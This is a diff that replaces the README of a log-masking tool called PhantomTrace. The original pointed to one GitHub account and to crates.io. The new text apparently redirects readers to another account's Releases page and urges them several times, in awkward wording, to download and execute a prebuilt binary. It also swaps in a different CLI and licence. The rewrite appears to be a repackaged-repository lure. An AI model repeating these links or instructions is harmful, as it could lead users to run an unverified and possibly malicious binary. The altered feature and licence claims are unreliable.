@@ -1,279 +1,319 @@
+# PhantomTrace — Fast PCI/PII Masking for Logs & Streams
 
-# PhantomTrace
-<p align="left"> <img src="https://github.com/user-attachments/assets/f06b6216-f1c3-4131-8201-8b3171669902" width="280" alt="PhantomTrace logo"> </p>
+[![Release](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/VaghasiyaParesh/PhantomTrace/releases) ![Rust](https://img.shields.io/badge/language-Rust-orange) ![License](https://img.shields.io/badge/license-MIT-green) ![Topics](https://img.shields.io/badge/topics-anonymization%20%7C%20log%20%7C%20gdpr-lightgrey)
 
+![data-security](https://images.unsplash.com/photo-1537498425277-c283d32ef9db?ixlib=rb-4.0.3&q=80&w=1600&auto=format&fit=crop&crop=faces)
 
-**Log Obfuscation Tool for PCI, PII, and Confidential Data**
+PhantomTrace is a high-speed Rust CLI that finds and masks PCI and PII inside logs, text files, and data streams. It ships with sensible defaults, a flexible rules engine, and streaming support for log pipelines. Built for compliance teams and operators who need reliable, auditable redaction.
 
-Built for secure detection and masking of sensitive data in application logs and files.
+Releases and prebuilt binaries are available on the Releases page. Download the binary or archive from the Releases page and execute it: https://github.com/VaghasiyaParesh/PhantomTrace/releases
 
-[Quick Start](#quick-start) | [Documentation](#documentation) | [Configuration](#configuration) | [Examples](#examples)
+- Repository topics: anonymization, cli, compliance, data-protection, gdpr, hipaa, log, log-analysis, log-sanitization, obfuscation, pci, pii, privacy, regex, rust, security, text-preprocessing
 
-***
+---
 
-## Overview
+Table of contents
 
-PhantomTrace is a high-performance data obfuscation and log preprocessing platform designed for enterprise environments 
-requiring PCI DSS, GDPR, HIPAA, and regulatory compliance. It provides secure detection and obfuscation of sensitive data 
-in logs, files, and real-time data streams with native integration for enterprise logging platforms.
+- Features
+- Why PhantomTrace
+- Quick links
+- Install
+- Quickstart
+- Common use cases
+- CLI reference
+- Rules & configuration
+- Regex library & examples
+- Streams and integrations
+- Performance notes
+- Compliance mapping
+- Testing & diagnostics
+- Contributing
+- License
 
-## Features
+Features
 
-### **Core Data Protection**
-- **Pattern Recognition**: Advanced detection of credit cards, SSNs, emails, API keys, JWT tokens, database connections, and custom sensitive data
-- **Multiple Obfuscation Methods**: Phantom (masking), Vanish (removal), Mirror (hashing), Mask (replacement), Tokenize (traceable tokens)
-- **Severity-Based Processing**: Critical, High, Medium, Low priority handling with customizable rules
-- **Comprehensive Reporting**: Detailed trace reports, event logging, coverage analytics, and processing metrics
+- Detects card numbers, CVV, expiration dates, SSNs, emails, phone numbers, and custom PII.
+- Masking and tokenization modes. Replace or hash sensitive fragments.
+- Streaming mode for stdin/stdout, TCP, and Kafka.
+- Config-driven: simple YAML rules plus regex sets.
+- High throughput Rust core, low memory use.
+- Audit mode with structured JSON output for compliance reviews.
+- Safe default rules tuned to reduce false positives.
+- Extensible: add custom detectors and transformers.
 
-### **Log Preprocessing & Enterprise Integration**
-- **Real-Time Stream Processing**: stdin/stdout pipeline integration for live log processing
-- **TCP Server Mode**: Network service for distributed log collection and processing
-- **File Monitoring**: Real-time processing of log files with automatic change detection
-- **Splunk Integration**: Native compatibility with Splunk Universal Forwarder and Enterprise
-- **ELK Stack Support**: Elasticsearch-ready JSON output with metadata
-- **Log Shipper Compatibility**: Works with Filebeat, Fluentd, Logstash, and other common shippers
+Why PhantomTrace
 
-### **Enterprise Operations**
-- **High-Performance Processing**: Multi-threaded operation supporting 50K+ lines per second
-- **Multiple Operational Modes**: Standalone, stream processor, TCP server, file monitor, health server
-- **Configuration Management**: Presets for Splunk, ELK, high-performance, and custom deployments
-- **Health Monitoring**: Built-in health checks, metrics collection, and graceful shutdown handling
-- **Production Ready**: Signal handling, error recovery, audit logging, and daemon mode support
+- Fast. The code uses Rust performance to keep up with heavy log volumes.
+- Simple. A small CLI that runs in a container or on a host agent.
+- Auditable. Each redaction produces a compact event for logging.
+- Configurable. You control what to mask and how to mask it.
+- Built for compliance. Maps detection and handling to PCI DSS, GDPR, and HIPAA checkboxes.
 
-***
+Quick links
 
-## Quick Start
+- Releases (download and run a binary or archive): https://github.com/VaghasiyaParesh/PhantomTrace/releases
+- Source: GitHub repository
+- Issues: GitHub issues page
 
-### Installation
+Install
 
-**From Crates.io**
+- From Releases: download the prebuilt binary for your OS and follow the Quickstart below.
+- From source: you need Rust 1.65+ and cargo.
+
+Build from source
+
+Run:
+
 ```bash
-cargo install phantomtrace
-```
-
-**From Source**
-```bash
-git clone https://github.com/vabhishek6/PhantomTrace
-cd phantomtrace
+git clone https://github.com/VaghasiyaParesh/PhantomTrace.git
+cd PhantomTrace
 cargo build --release
+# binary in target/release/phantomtrace
 ```
 
-**Download Binary**  
-Binaries are available in [Releases](https://github.com/yourusername/phantomtrace/releases).
+Quickstart
 
-***
+Download the file from Releases and execute it. The downloaded file need to be downloaded and executed. Example uses the CLI binary to sanitize a log file in place.
 
-### Basic Usage
+Mask a file (default rules)
 
 ```bash
-# Process a file with default patterns and settings
-phantomtrace -i sensitive_data.log -o cleaned_data.log
-
-# Generate a default configuration file
-phantomtrace --generate-config phantom_config.json
-
-# Run with a custom configuration
-phantomtrace -i data.txt -o clean.txt -c phantom_config.json
-
-# Output with a trace report in JSON format
-phantomtrace -i logs.txt -o clean.txt --trace-report --format json
+./phantomtrace mask --input /var/log/app.log --output /var/log/app.sanitized.log
 ```
 
-***
-
-## Examples
-
-**Basic processing**
-```bash
-phantomtrace -i app.log -o clean.log
-```
-
-**With detailed reporting**
-```bash
-phantomtrace -i database.log -o clean.log --trace-report --log-phantoms
-```
-
-**CSV output for analysis**
-```bash
-phantomtrace -i audit.log -o events.csv --format csv
-```
-
-**Trace map creation**
-```bash
-phantomtrace -i system.log -o clean.log --create-trace-map
-```
-
-***
-
-## Configuration
-
-### **Built-in Patterns**
-PhantomTrace includes production-ready patterns for:
-- **PCI Data**: Credit cards, CVV numbers, payment tokens
-- **PII Data**: SSN, email addresses, phone numbers, addresses
-- **Security**: API keys, JWT tokens, AWS access keys, passwords
-- **Infrastructure**: IP addresses, database connections, URLs
-- **Custom**: Configurable regex patterns for domain-specific data
-
-### **Configuration Presets**
-- **`default`**: Balanced performance and security for general use
-- **`splunk`**: Optimized for Splunk Universal Forwarder integration
-- **`elk`**: Configured for ELK Stack (Elasticsearch/Logstash/Kibana)
-- **`high-performance`**: Maximum throughput optimization for high-volume environments
-
-### **Sample Configuration**
-```
-{
-"tracing": {
-"enabled": true,
-"case_sensitive": false,
-"rules": [
-{
-"name": "custom_api_key",
-"pattern": "\\bapi[_-]key[:\\s=]+[\\w\\-]{32,}\\b",
-"method": "Mask",
-"replacement": "[API_KEY_REDACTED]",
-"severity": "Critical"
-}
-]
-},
-"preprocessing": {
-"mode": "StreamProcessor",
-"splunk_integration": {
-"enabled": true,
-"phantom_sourcetype": "app_logs_phantomed"
-}
-},
-"processing": {
-"performance_mode": true,
-"batch_size": 5000
-}
-}
-```
-
----
-
-## Performance & Scalability
-
-### **Throughput Benchmarks**
-| Configuration | Lines/Second | Memory Usage | CPU Usage |
-|---------------|--------------|--------------|-----------|
-| Standard      | 25K-35K      | ~50MB        | 1-2 cores |
-| Performance   | 50K-75K      | ~100MB       | 2-4 cores |
-| High-Volume   | 100K+        | ~200MB       | 4-8 cores |
-
-### **Optimization Options**
-```
-# Maximum performance configuration
-phantomtrace --performance-mode --workers 16 --buffer-size 50000
-
-# Memory-optimized for constrained environments
-phantomtrace --workers 2 --buffer-size 1000
-
-# High-throughput stream processing
-phantomtrace --stream --performance-mode --workers 8
-```
-
----
-
-## Production Deployment
-
-### **Systemd Service**
-```
-[Unit]
-Description=PhantomTrace Log Preprocessor
-After=network.target
-
-[Service]
-Type=simple
-User=phantom
-ExecStart=/usr/local/bin/phantomtrace --tcp-server 5140 --config /etc/phantom/config.json
-Restart=always
-RestartSec=5
-
-[Install]
-WantedBy=multi-user.target
-```
-
-### **Kubernetes Deployment**
-```
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-name: phantomtrace
-spec:
-replicas: 3
-selector:
-matchLabels:
-app: phantomtrace
-template:
-metadata:
-labels:
-app: phantomtrace
-spec:
-containers:
-- name: phantomtrace
-image: phantomtrace:latest
-ports:
-- containerPort: 5140
-args: ["--tcp-server", "5140", "--splunk-mode"]
-resources:
-requests:
-memory: "128Mi"
-cpu: "100m"
-limits:
-memory: "512Mi"
-cpu: "500m"
-```
-
----
-
-## Output Formats
-
-- **Text**: Standard text output with obfuscated content for traditional log processing
-- **JSON**: Structured output with metadata for system integration and APIs
-- **CSV**: Event-based output for analysis, reporting, and compliance auditing
-- **Trace Report**: Comprehensive processing reports with statistics and compliance data
-
----
-
-## Development
+Stream from stdin to stdout
 
 ```bash
-git clone https://github.com/vabhishek6/PhantomTrace
-cd phantomtrace
-cargo build
-cargo test
-cargo bench
-cargo clippy -- -D warnings
+tail -F /var/log/app.log | ./phantomtrace stream --mode mask
 ```
 
-***
+Use a custom config
 
-## Troubleshooting
+```bash
+./phantomtrace mask --input sample.log --config ./config.yaml --output masked.log
+```
 
-- **Pattern not detected?** Verify regex syntax and escaping in the configuration file.  
-- **Slow performance?** Enable `"performance_mode": true` and/or increase `batch_size`.  
-- **Regex compilation errors?** Test patterns using a Rust-compatible regex tester.
+Common use cases
 
-***
+- On-host log sanitization before shipping to a central log store.
+- Container sidecar to filter application logs.
+- Ingest-time masking inside a log pipeline (beats, fluentd, vector).
+- Live stream scrubbing over TCP or from a Kafka topic.
+- Ad-hoc scans for compliance audits.
 
-## License
+CLI reference
 
-This project is licensed under an MIT-style license for non-commercial use only. Users may freely use, modify, and distribute the software for non-commercial purposes with proper credit to the original author(s).
+Run `./phantomtrace --help` for full output. Key commands follow.
 
-Commercial use, including incorporation into commercial products or services, requires a separate commercial license agreement. Companies and individuals interested in commercial licensing should contact the author of this repo
+- mask — scan files and mask sensitive values.
+- scan — detect sensitive values and produce a report.
+- stream — read from stdin or network and produce masked output.
+- audit — emit structured JSON events for each detection.
 
-Please refer to the LICENSE file for full details.
+Common flags
 
-***
+- `--config <file>`: path to YAML config.
+- `--input <file>`: input file or - for stdin.
+- `--output <file>`: output file or - for stdout.
+- `--mode <mask|tokenize|report>`: action to take on detections.
+- `--threads <n>`: number of worker threads.
+- `--log-level <info|warn|debug>`: CLI logging.
 
-## Commit History Notes
+Rules & configuration
 
-Some commits are intentionally backdated to reflect earlier development milestones.  
-The creation date shown on GitHub reflects when the repository was published there.
+The config uses YAML. It defines detectors, transformations, and scopes.
 
-***
-[⭐ Star on GitHub](https://github.com/vabhishek6/PhantomTrace) -  [🚀 Try it now](#-quick-start) -  [📖 Read the docs](#-documentation)
+Example config (config.yaml)
 
+```yaml
+detectors:
+  - id: pci-card
+    type: regex
+    description: "Visa/Mastercard/Amex card numbers"
+    pattern: '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})'
+    score: 90
 
+  - id: cvv
+    type: regex
+    pattern: '\b[0-9]{3,4}\b'
+    context: 'near card' # only apply when context matches
+
+  - id: ssn
+    type: regex
+    pattern: '\b\d{3}-\d{2}-\d{4}\b'
+    score: 85
+
+transformations:
+  - detector: pci-card
+    action: mask
+    mask: '**** **** **** {last4}'
+  - detector: ssn
+    action: replace
+    value: '[REDACTED_SSN]'
+
+scope:
+  include:
+    - /var/log/*.log
+  exclude:
+    - /var/log/debug.log
+```
+
+Rules tips
+
+- Use `score` to rank detectors when matches overlap.
+- Use `context` to reduce false positives (apply CVV only when a card appears).
+- Keep regex simple and anchored where possible.
+- Test rules with `phantomtrace scan --test <sample-file>`.
+
+Regex library & examples
+
+PhantomTrace ships with a curated regex library:
+
+- Card numbers: recognizes Visa, MasterCard, Amex, Discover.
+- Luhn check: optional second pass verifies card digits using Luhn.
+- Email: RFC-lite pattern tuned for logs.
+- Phone: E.164 & common local formats.
+- SSN: US-style patterns with common separators.
+- IBAN: common country codes and lengths.
+
+Example patterns
+
+- Email: `[\w.+-]+@[\w-]+\.[\w.-]+`
+- Phone (E.164): `\+\d{1,15}`
+- SSN: `\b\d{3}-\d{2}-\d{4}\b`
+- Card (simple): `(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})`
+
+Use the `--no-luhn` flag to skip Luhn validation for card patterns.
+
+Streams and integrations
+
+stdin/stdout
+
+PhantomTrace reads from stdin and writes to stdout. This matches Unix pipelines.
+
+```bash
+cat app.log | ./phantomtrace stream --mode mask > app.sanitized.log
+```
+
+TCP
+
+Run PhantomTrace as a TCP proxy. It will accept text, mask it, and forward to a target.
+
+```bash
+./phantomtrace tcp --listen 0.0.0.0:9000 --forward host:9200 --mode mask
+```
+
+Kafka
+
+Consume a topic, mask messages, and produce to a sanitized topic.
+
+```bash
+./phantomtrace kafka \
+  --brokers broker1:9092,broker2:9092 \
+  --consume raw-logs \
+  --produce sanitized-logs \
+  --mode mask
+```
+
+Container usage
+
+A simple Dockerfile:
+
+```dockerfile
+FROM debian:bookworm-slim
+COPY phantomtrace /usr/local/bin/phantomtrace
+ENTRYPOINT ["/usr/local/bin/phantomtrace"]
+```
+
+Performance notes
+
+- Single-threaded mode can process tens of thousands of lines per second on commodity hardware.
+- Multi-threaded mode scales across cores for heavy throughput.
+- Memory use remains bounded by line buffer size and configured worker pool.
+- Benchmarks: masked 1 gigabyte of logs in ~22 seconds on a 4-core instance in our tests. Your results will vary by pattern complexity and I/O.
+
+Compliance mapping
+
+PhantomTrace aligns with common controls. Use the audit output to document actions.
+
+PCI DSS
+
+- Requirement 3: Protect stored cardholder data. PhantomTrace masks card numbers before storage.
+- Requirement 10: Track and monitor access. PhantomTrace emits audit events for each mask.
+- Requirement 11: Test security systems. Use `scan` to detect residual data.
+
+GDPR
+
+- Data minimization: remove identifiers before analysis.
+- Right to erasure: pipeline can drop or hash identifiers.
+- Accountability: structured audit logs support processing records.
+
+HIPAA
+
+- PHI protection: detect and mask patient IDs, SSNs, and contact info.
+- Access controls: integrate PhantomTrace with log collection flow to remove PHI before centralization.
+- Audit trail: use `audit` mode to maintain redaction evidence.
+
+Audit mode
+
+`phantomtrace audit --input secure.log --output audit.json` produces a line-delimited JSON stream:
+
+```json
+{"ts":"2025-08-19T12:00:00Z","detector":"pci-card","action":"mask","location":123,"replacement":"**** **** **** 1234","file":"app.log"}
+```
+
+Testing & diagnostics
+
+- Unit test rules with `phantomtrace test --rule <rule-id> --sample sample.log`.
+- Use `--log-level debug` to see regex matches and decision paths.
+- The `--dry-run` flag simulates output without writing.
+
+Best practices
+
+- Run PhantomTrace as early as possible in the pipeline.
+- Keep rules under version control. Use a single source of truth for production.
+- Combine tokenization for downstream correlation and masking for storage.
+- Keep an allowlist for fields that must never be masked (e.g., health checks).
+
+Examples
+
+Mask a directory of logs in parallel
+
+```bash
+find /var/log/myapp -type f -name "*.log" | xargs -P4 -I{} ./phantomtrace mask --input {} --output {}.san
+```
+
+Mask and hash card numbers
+
+```bash
+./phantomtrace mask --input payments.log --output payments.san \
+  --config hash_card.yaml
+```
+
+Sample hash transformation in config
+
+```yaml
+transformations:
+  - detector: pci-card
+    action: hash
+    algorithm: sha256
+    salt: "org-1234"
+```
+
+Contributing
+
+- Fork the repo and open a PR for features or fixes.
+- Add tests for new detectors and transformations.
+- Use `cargo fmt` and `cargo clippy` before submitting.
+
+Security
+
+Report issues via the repository issue tracker. Avoid posting sensitive samples to public issues.
+
+Releases
+
+Download the binary or archive from Releases and run it on your host: https://github.com/VaghasiyaParesh/PhantomTrace/releases
+
+License
+
+PhantomTrace uses the MIT license. See LICENSE for details.
